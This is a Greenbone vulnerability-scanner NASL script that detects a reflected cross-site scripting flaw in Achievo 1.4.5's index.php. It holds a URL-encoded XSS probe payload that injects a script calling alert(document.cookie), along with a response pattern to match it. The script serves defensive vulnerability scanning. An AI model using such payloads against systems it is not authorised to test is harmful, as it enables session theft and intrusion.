# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:achievo:achievo";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807623");
  script_version("2024-02-19T05:05:57+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2024-02-19 05:05:57 +0000 (Mon, 19 Feb 2024)");
  script_tag(name:"creation_date", value:"2016-04-06 16:24:56 +0530 (Wed, 06 Apr 2016)");
  script_name("Achievo XSS Vulnerability (Mar 2016)");

  script_tag(name:"summary", value:"Achievo is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether it is possible to read a cookie or not.");

  script_tag(name:"insight", value:"The flaw exists due to an improper sanitization
  of input to 'index.php' page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to obtain potentially sensitive information, which may lead to
  further attacks.");

  script_tag(name:"affected", value:"Achievo 1.4.5");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Mar/74");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_achievo_detect.nasl");
  script_mandatory_keys("Achievo/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

url = dir + '/index.php?%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E';

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   # nb: This was originally only a "\_" but it wasn't clear if this was just a typo
   pattern:"<script>alert\(document[._]cookie\)</script>",
   extra_check:make_list("Achievo", ">Login", ">Username")))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
